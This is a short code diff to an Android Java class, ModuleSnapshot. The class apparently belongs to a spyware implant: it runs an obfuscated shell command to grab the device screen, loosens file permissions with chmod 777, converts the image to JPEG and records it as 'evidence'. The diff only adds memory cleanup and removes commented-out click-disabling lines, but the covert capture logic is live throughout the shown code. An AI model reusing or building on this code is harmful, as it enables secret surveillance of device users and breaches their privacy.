@@ -192,8 +192,6 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (asc.exists() && asc.canRead()) {
 
 			try {
-				//disableClick();
-
 				ExecuteResult res = Execute.executeScript(sc + M.e(" -p ") + frame + M.e(";chmod 777 ") + frame);
 				if (aframe.exists() && aframe.canRead()) {
 					Bitmap bitmap = readPng(aframe);
@@ -201,16 +199,20 @@ public class ModuleSnapshot extends BaseInstantModule {
 						return false;
 					}
 					byte[] jpeg = toJpeg(bitmap);
+					bitmap = null;
+
 					if (jpeg == null) {
 						return false;
 					}
+
 					EvidenceBuilder.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+
+					System.gc();
 					return true;
 				}
 
 			}finally{
 				aframe.delete();
-				//enableClick();
 			}
 		}
 		return false;
